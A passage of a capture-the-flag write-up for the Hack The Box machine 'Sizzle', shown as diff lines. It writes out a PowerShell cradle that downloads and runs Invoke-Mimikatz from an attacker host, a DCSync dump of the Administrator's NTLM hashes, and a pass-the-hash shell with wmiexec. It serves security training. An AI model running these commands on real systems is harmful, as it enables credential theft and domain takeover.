+<p>Once the information is uploaded, if we start checking the default queries we can see something interesting using <b>Find Principals with DCSync Rights</b>.</p>
+
+<img class="img-fluid" src="/static/img/htb/sizzle/6.png">
+
+<p><code>mrlky</code> has <code>GetChanges</code> and <code>GetChangesAll</code> privileges for <code>HTB.LOCAL</code>. If we right click the edge we can get more information about these privileges and how we can abuse them.</p>
+
+<img class="img-fluid" src="/static/img/htb/sizzle/7.png">
+
+<p>We can execute a <code>dcsync</code> attack to retrieve the Administrator hash using <code>mimikatz</code>.</p>
+
+<p>We're going to load it with <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1" target="_blank"><code>Invoke-Mimikatz.ps1</code></a> and run the command we saw on <code>bloodhound</code>.</p>
+
+<pre class="prettyprint">
+PS C:\Users\mrlky\Downloads> IEX(New-Object Net.Webclient).downloadString('http://10.10.16.72/Invoke-Mimikatz.ps1')
+PS C:\Users\mrlky\Downloads> Invoke-Mimikatz -Command '"Lsadump::dcsync /domain:HTB.LOCAL /user:Administrator"'
+
+  .#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  '#####'                                     with 20 modules * * */
+
+mimikatz(powershell) # Lsadump::dcsync /domain:HTB.LOCAL /user:Administrator
+[DC] 'HTB.LOCAL' will be the domain
+[DC] 'sizzle.HTB.LOCAL' will be the DC server
+[DC] 'Administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 7/12/2018 1:32:41 PM
+Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: f6b7160bfc91823792e0ac3a162c9267
+    ntlm- 0: f6b7160bfc91823792e0ac3a162c9267
+    ntlm- 1: c718f548c75062ada93250db208d3178
+    lm  - 0: 336d863559a3f7e69371a85ad959a675
+...
+</pre>
+
+<p>We got the <code>Administrator</code> NTLM hash!</p>
+
+<p>Using <code>wmiexec</code> we can get a shell as administrator using that hash.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/sizzle# /opt/impacket/examples/wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 Administrator@10.10.10.103
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+htb\administrator
+</pre>
+
+<p>The root flag is in the administrator's desktop.</p>
+
+<pre class="prettyprint">
+C:\Users\Administrator\Desktop>type root.txt
+<span flag="91c5849357ffe2c87683d3bd6729d72e">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
